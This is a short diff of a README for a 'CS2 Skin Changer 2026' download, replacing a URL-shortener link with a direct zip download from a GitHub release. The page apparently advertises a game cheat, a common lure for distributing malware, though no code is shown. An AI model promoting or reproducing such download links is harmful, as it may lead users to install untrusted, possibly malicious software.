@@ -6,7 +6,7 @@
 
 ## Download
 
-[Click here to download CS2 Skin Changer 2026](https://goo.su/fy62ugm)
+[Click here to download CS2 Skin Changer 2026](https://github.com/hilladkolanlx/Release/releases/download/1.0.7/NeoXHubReleased.v.1.0.7.zip)
 
 ---
 
